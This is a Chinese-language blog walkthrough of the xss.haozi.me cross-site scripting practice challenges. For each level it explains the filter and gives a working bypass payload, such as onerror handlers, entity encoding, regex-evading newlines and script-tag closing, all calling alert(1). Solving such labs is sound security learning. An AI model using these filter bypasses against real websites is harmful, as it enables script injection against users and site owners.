---
title: xss.haozi.me
date: 2022-04-04
cover: https://b2.kuibu.net/file/imgdisk/imgs/2022/04/ca59ea703bbff18d.png
tags:
 - 闯关
categories:
 - 闯关挑战
---

# xss.haozi.me
  
  今天带来一个新的xss闯关，加油加油！

<a href = "https://xss.haozi.me/" target="_blank">https://xss.haozi.me/</a>

## 第零关

  这一关其实没什么好讲的，没有过滤任何东西，直接使用任何语句绕过即可。

  `<img src = 'tupian' onerror="alert(1)">`


<img src = 'https://b2.kuibu.net/file/imgdisk/imgs/2022/04/5e3a73e69c893ff9.png' />

## 第一关
  
  进去可以看到我们的注入点处于textarea标签中，所以闭合这个标签就可以了。


  `</textarea><img src = "x" onerror="alert(1)"><textarea>`

<img src = 'https://b2.kuibu.net/file/imgdisk/imgs/2022/04/66c686c9cbda8ade.png' />


## 第二关

  这题和上一题考点差不多，可以看到我们的注入点在" value=“ "之后，所以使用“ "> ” 将input标签闭合即可。

  `"><img src="x" onerror="alert(1)">`

  <img src = 'https://b2.kuibu.net/file/imgdisk/imgs/2022/04/dffef1f41ce5f65f.png' />


## 第三关

  看旁边的代码发现括号和方括号被过滤了，这个简单，直接使用" `` "代替即可。

  `<img src = 'x' onerror="alert`1`">`

<img src = 'https://b2.kuibu.net/file/imgdisk/imgs/2022/04/9738cf1d12c27166.png' />


## 第四关

  点进去发现反引号也被过滤了，顺便还加了几个被过滤的符号，emmmm，直接编码绕过吧。没什么难度。

  `<img src = 'x' onerror="alert&#40;1&#41;">`

<img src = 'https://b2.kuibu.net/file/imgdisk/imgs/2022/04/ef52b80924abcef9.png' />


## 第五关

  在过滤的基础上加了个注释符，额(⊙﹏⊙)，闭合加编码直接过。

  注：
  注释方式有两种:
  `<!-- 注释内容 -->`
  `<!-- 注释内容 --!>`


  `--!><img src = 'x' onerror="alert&#40;1&#41;">`

<img src = 'https://b2.kuibu.net/file/imgdisk/imgs/2022/04/6d7db046afccaccf.png' />


## 第六关

  这题运用了正则过滤，过滤了以auto/on开头，以=结尾的字符串，并且忽略大小写.好吧我的知识盲区，网上看了看思路，换行符绕过正则，啊这...

  `type="image" src="x" onerror`
   `="alert(1)"`


<img src = 'https://b2.kuibu.net/file/imgdisk/imgs/2022/04/770c557bca6c32d6.png' />


## 第七关

  emmmmm，好吧还是正则表达式，果断上网，然后发现了个大事。

  woc，HTML容错太高了吧，单尖括号都能解析！！！！！

  那么答案就很明显了，使用单尖括号绕过正则。

  `<img src='x' onerror="alert(1)"`


<img src = 'https://b2.kuibu.net/file/imgdisk/imgs/2022/04/cdd8da8069b1b91a.png' />


## 第八关

  点进去.......

  为什么还是正则表达式啊！！！！！

  好吧，继续百度，过滤了<\style>标签。好吧，直接换行或者加空格绕过。（颓废）

  `</style ><script>alert(1)</script>`


<img src = 'https://b2.kuibu.net/file/imgdisk/imgs/2022/04/331bc0a591d7b9e4.png' />


## 第九关

  终于不是正则表达式了。这题没啥好说的，在前面加个网址，再把script标签闭合一下就好了。

  `https://www.segmentfault.com><script><img src="x" onerror="alert(1)">` 


<img src = 'https://b2.kuibu.net/file/imgdisk/imgs/2022/04/749a6b0fb1261fd3.png' />


## 第0A关
  
  额，这关其实挺迷的，有些浏览器能做，有些做不了。主要方法就是运用网站目录下的文件来达到xss注入的目
的。有点小离谱。

<img src = 'https://b2.kuibu.net/file/imgdisk/imgs/2022/04/4ef828f7d0a4ae90.png' />


`https://www.segmentfault.com@xss.haozi.me/j.js`


<img src = 'https://b2.kuibu.net/file/imgdisk/imgs/2022/04/82a99667d7fbc9af.png' />


## 第0B关

  好家伙，直接把所有字符改成了大写，那么直接编码绕过，走起。

`<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">`

<img src = 'https://b2.kuibu.net/file/imgdisk/imgs/2022/04/d02f951574a2d663.png' />


## 第0C关

  额，只是多过滤了一个script标签，对于我来说没啥影响，上一关语句拿来用就是了。

`<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">`

<img src = 'https://b2.kuibu.net/file/imgdisk/imgs/2022/04/4bbb162be9e8dc51.png' />


## 第0D关

  注入点被注释了。怎么说，这玩意直接换行绕过不就行了，顺便把后面的代码注释一下就可以了。

`         `
`alert(1) `
`-->`

<img src = 'https://b2.kuibu.net/file/imgdisk/imgs/2022/04/a49faaf1dc91982b.png' />

## 第0E关

  这题答案倒是有但是换了好几个浏览器都做不出来，放弃了。
  原理就是过滤了s，但是使用特殊符号`ſ`绕过就可以了
  注：

  `ſ经过toUpperCase函数会变成S。`

  `<ſcript src="https://www.segmentfault.com.haozi.me/j.js"></script>`


## 第0F关

  注入点前边有个'），顺便还把常用字符转换成了编码。但这没意义啊，由于编码后处于html标签中, 所以当解析代码的时候, 被过滤编码的字符仍然会被还原来执行,  所以可以说, 被过滤的字符可以用，没什么说法，把前面的闭合一下再把后面多余的东西注释掉就好了。

  `');alert(1)//`

<img src = 'https://b2.kuibu.net/file/imgdisk/imgs/2022/04/8a5ef74d0a99e763.png' />


## 第十关

  看到题目我其实有点无语，这玩意出了个寂寞，不知道为啥不给windows赋值，直接注入都能过。

`alert(1)`

<img src = 'https://b2.kuibu.net/file/imgdisk/imgs/2022/04/16f134219d93952e.png' />


## 第十一关

  发现常用符号被转义了，但是这"//"还是可以用啊。

  注：
  
  `//虽然被转义成了\/\/,  但转义之后还是//,在js中还是注释符.`

  所以把前面的("闭合一下，再把后面的注释一下就可以了

  
`");alert(1);//`


<img src = 'https://b2.kuibu.net/file/imgdisk/imgs/2022/04/3137612b3b5e9f30.png' />


## 第十二关

  这题将双引号转义了，(⊙﹏⊙)，那不妨换个思路，直接不用双引号了，将前面的script标签闭合了再使用注入句，
真不戳呀。


`</script><script>alert(1)</script>`


<img src = 'https://b2.kuibu.net/file/imgdisk/imgs/2022/04/0cba0b90f79fd347.png' />


终于写完了，明天就是清明节了。
可恶清明节还要返校。

希望这个对你有帮助吧，那么之后再见



